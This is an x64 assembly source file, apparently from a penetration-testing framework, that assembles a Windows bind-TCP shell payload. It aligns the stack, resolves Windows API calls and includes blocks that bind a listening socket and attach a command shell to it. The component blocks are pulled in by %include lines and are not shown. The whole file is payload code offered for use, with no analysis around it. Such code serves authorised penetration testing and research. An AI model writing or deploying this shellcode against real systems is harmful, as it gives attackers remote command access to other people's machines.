;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Size: 505 bytes
; Build: >build.py single_shell_bind_tcp
;-----------------------------------------------------------------------------;
[BITS 64]
[ORG 0]

  cld                    ; Clear the direction flag.
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop rbp                ; Pop off the address of 'api_call' for calling later.
%include "./src/block/block_bind_tcp.asm"
  ; By here we will have performed the bind_tcp connection and EDI will be out socket.
%include "./src/block/block_shell.asm"
	; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"